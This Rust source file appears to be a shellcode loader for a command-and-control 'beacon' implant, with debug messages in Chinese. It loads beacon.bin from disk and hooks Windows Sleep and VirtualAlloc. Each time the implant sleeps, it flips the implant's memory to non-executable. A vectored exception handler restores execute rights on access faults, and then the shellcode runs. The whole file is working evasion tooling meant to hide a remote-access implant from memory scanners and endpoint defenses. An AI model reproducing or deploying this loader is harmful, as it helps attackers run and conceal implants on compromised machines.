#[macro_use]
extern crate lazy_static;

use detour::static_detour;
use std::env;
use std::fs::File;
use std::io::Read;
use std::sync::mpsc;
use std::sync::Mutex;
use std::thread;
use std::{ffi::CString, iter, mem};
use winapi::shared::basetsd::{DWORD64, SIZE_T};
use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::shared::ntdef::LONG;
use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::winnt::PEXCEPTION_POINTERS;
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};

lazy_static! {
    static ref BEACON_ADDRESS: Mutex<usize> = Mutex::new(0);
    static ref BEACON_DATA_LEN: Mutex<usize> = Mutex::new(0);
    static ref EVENT_HANDLE: Mutex<Option<mpsc::SyncSender<()>>> = Mutex::new(None);
}

static_detour! {
    static VirtualAllocHook: unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
    static SleepHook: unsafe extern "system" fn(DWORD);
}

type Sleep = unsafe extern "system" fn(DWORD);
type VirtualAlloc = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;

unsafe fn do_hook() {
    let address_sleep = get_module_symbol_address("kernelbase.dll", "Sleep")
        .expect("could not find 'Sleep' address");
    let target_sleep: Sleep = mem::transmute(address_sleep);

    SleepHook
        .initialize(target_sleep, sleep_detour)
        .expect("SleepExHook initialize failed!")
        .enable()
        .expect("SleepExHook enable failed!");

    let address_virtualalloc = get_module_symbol_address("kernel32.dll", "VirtualAlloc")
        .expect("could not find 'Sleep' address");
    let target_virtualalloc: VirtualAlloc = mem::transmute(address_virtualalloc);

    VirtualAllocHook
        .initialize(target_virtualalloc, virtualalloc_detour)
        .expect("VirtualAllocHook initialize failed!")
        .enable()
        .expect("VirtualAllocHook enable failed!");
}

fn sleep_detour(dw_milliseconds: DWORD) {
    println!("Sleep {}s", dw_milliseconds / 1000);
    if let Some(event_tx) = EVENT_HANDLE.lock().unwrap().clone() {
        let _ = event_tx.try_send(());
    }
    unsafe { SleepHook.call(dw_milliseconds) }
}

fn virtualalloc_detour(
    lp_address: LPVOID,
    dw_size: SIZE_T,
    fl_allocation_type: DWORD,
    fl_protect: DWORD,
) -> LPVOID {
    println!("VirtualAlloc 分配大小: {}", dw_size);
    let address =
        unsafe { VirtualAllocHook.call(lp_address, dw_size, fl_allocation_type, fl_protect) };
    println!("VirtualAlloc 分配地址: 0x{:X}", address as u64);
    *BEACON_ADDRESS.lock().unwrap() = address as usize;
    *BEACON_DATA_LEN.lock().unwrap() = dw_size as usize;
    address
}

unsafe extern "system" fn first_vect_excep_handler(p_excep_info: PEXCEPTION_POINTERS) -> LONG {
    let exception_record = *(*p_excep_info).ExceptionRecord;
    let context_record = *(*p_excep_info).ContextRecord;
    println!("异常错误码：{}", exception_record.ExceptionCode);
    println!("线程地址：{}", context_record.Rip);
    if exception_record.ExceptionCode == 0xc0000005 && is_exception(context_record.Rip) {
        println!("恢复Beacon内存属性");
        let beacon_address = *BEACON_ADDRESS.lock().unwrap();
        let beacon_data_len = *BEACON_DATA_LEN.lock().unwrap();
        region::protect(
            beacon_address as *const u8,
            beacon_data_len,
            region::Protection::READ_WRITE_EXECUTE,
        )
        .unwrap();
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

fn is_exception(exception_addr: DWORD64) -> bool {
    let beacon_address = *BEACON_ADDRESS.lock().unwrap() as u64;
    let beacon_data_len = *BEACON_DATA_LEN.lock().unwrap() as u64;
    if exception_addr > beacon_address as u64
        && exception_addr < beacon_address as u64 + beacon_data_len as u64
    {
        println!("地址符合：{}", exception_addr);
        true
    } else {
        println!("地址不符合：{}", exception_addr);
        false
    }
}

fn beacon_set_memory_attributes_safe(rx: mpsc::Receiver<()>) {
    loop {
        let _ = rx.recv();
        let beacon_address = *BEACON_ADDRESS.lock().unwrap();
        let beacon_data_len = *BEACON_DATA_LEN.lock().unwrap();
        println!(
            "设置Beacon内存属性不可执行: addr: 0x{:X} size: {}",
            beacon_address, beacon_data_len
        );
        unsafe {
            region::protect(
                beacon_address as *const (),
                beacon_data_len,
                region::Protection::READ_WRITE,
            )
            .unwrap();
        }
    }
}

fn get_module_symbol_address(module: &str, symbol: &str) -> Option<usize> {
    let module = module
        .encode_utf16()
        .chain(iter::once(0))
        .collect::<Vec<u16>>();
    let symbol = CString::new(symbol).unwrap();
    unsafe {
        let handle = GetModuleHandleW(module.as_ptr());
        match GetProcAddress(handle, symbol.as_ptr()) as usize {
            0 => None,
            n => Some(n),
        }
    }
}

unsafe fn mmain() {
    let beacon_path = match env::args().nth(1) {
        Some(p) => p,
        None => "./beacon.bin".into(),
    };
    let mut file = File::open(beacon_path).unwrap();
    let mut beacon = Vec::new();
    file.read_to_end(&mut beacon).unwrap();
    // TODO: you should do some decryption.

    let beacon_size = beacon.len();
    // transmute will copy bits -> change the pointer
    let code: extern "system" fn() -> ! = std::mem::transmute(beacon.as_ptr());
    let beacon_ptr = code as *const ();

    println!(
        "beacon addr: 0x{:X}, size: {}",
        beacon_ptr as usize, beacon_size
    );

    AddVectoredExceptionHandler(1, Some(first_vect_excep_handler));
    do_hook();

    let (tx, rx) = mpsc::sync_channel(1);
    {
        EVENT_HANDLE.lock().unwrap().replace(tx);
    }
    thread::spawn(move || {
        beacon_set_memory_attributes_safe(rx);
    });

    region::protect(
        beacon_ptr as *const u8,
        beacon_size,
        region::Protection::READ_WRITE_EXECUTE,
    )
    .expect("set shellcode region executeable failed!");

    println!("start to execute shellcode");
    code();
}

fn main() {
    unsafe { mmain() }
}
